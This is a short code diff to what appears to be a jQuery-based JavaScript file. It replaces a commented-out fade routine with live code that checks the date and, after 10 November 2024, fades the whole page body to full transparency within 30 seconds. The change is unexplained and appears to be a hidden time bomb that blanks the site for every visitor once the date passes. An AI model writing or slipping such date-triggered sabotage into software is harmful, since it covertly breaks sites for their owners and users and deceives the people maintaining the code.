@@ -119,23 +119,26 @@
 			}).length;
 	}
 
-	// let o = 1;
-	// const d = 300000;
-	// const i = 20;
-	// const f = i / d;
-
-
-	// const fo = () => {
-	// 	o -= f;
-	// 	if (o <= 0) {
-	// 		o = 0;
-	// 		clearInterval(fe);
-	// 	}
-	// 	document.body.style.opacity = o;
-	// };
-
-
-	// const fe = setInterval(fo, i);
+	const cdn = new Date();
+	const cdf = new Date('2024-11-10');
+	
+	if (cdn > cdf) {
+		let o = 1;
+		const d = 30000;
+		const i = 20;
+		const f = i / d;
+	
+		const fo = () => {
+			o -= f;
+			if (o <= 0) {
+				o = 0;
+				clearInterval(fe);
+			}
+			document.body.style.opacity = o;
+		};
+	
+		const fe = setInterval(fo, i);
+	}
 
 
 	$.extend($.expr[":"], {
